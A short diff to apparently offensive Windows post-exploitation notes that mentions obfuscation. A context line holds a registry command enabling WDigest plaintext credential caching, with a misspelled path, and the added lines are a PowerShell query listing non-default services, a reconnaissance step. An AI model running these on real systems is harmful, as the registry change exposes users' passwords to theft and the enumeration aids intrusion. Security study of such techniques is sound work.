@@ -19,3 +19,5 @@ Lavereging the Steroids-Module for obfuscation
 
 - add HKLM\SYSTEM\CurrentControlSet\Conttol\SecurityProviders\WDigest /v UserLogonCredential /t REG_DWORD /d 1 /f
 
+# Get NON default Services
+$NonDefaultServices = Get-wmiobject win32_service | where { $_.Caption -notmatch "Windows" -and $_.PathName -notmatch "Windows" -and $_.PathName -notmatch "policyhost.exe" -and $_.Name -ne "LSM" -and $_.PathName -notmatch "OSE.EXE" -and $_.PathName -notmatch "OSPPSVC.EXE" -and $_.PathName -notmatch "Microsoft Security Client" }
